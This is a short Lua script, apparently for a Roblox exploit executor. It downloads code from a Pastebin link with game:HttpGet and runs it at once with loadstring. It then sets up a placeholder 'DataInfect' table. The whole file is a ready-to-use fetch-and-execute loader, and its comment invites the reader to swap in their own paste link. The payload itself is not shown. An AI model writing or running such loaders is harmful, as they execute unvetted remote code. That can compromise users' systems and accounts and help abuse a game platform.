-- Script to fetch and execute code from Pastebin
local URL = "https://pastebin.com/SYqFqGYA"  -- Replace with your actual Pastebin raw link

local Response = game:HttpGet(URL)
if Response then
    loadstring(Response)()
    pcall(function()
        local DataInfect = {
            Attached = false;
            Data = nil;
            Loaded = false;
            -- Add other properties as needed
        }
        
        -- Your code to handle the DataInfect object
        print("Script loaded successfully")
    end)
else
    warn("Failed to fetch script from Pastebin")
end
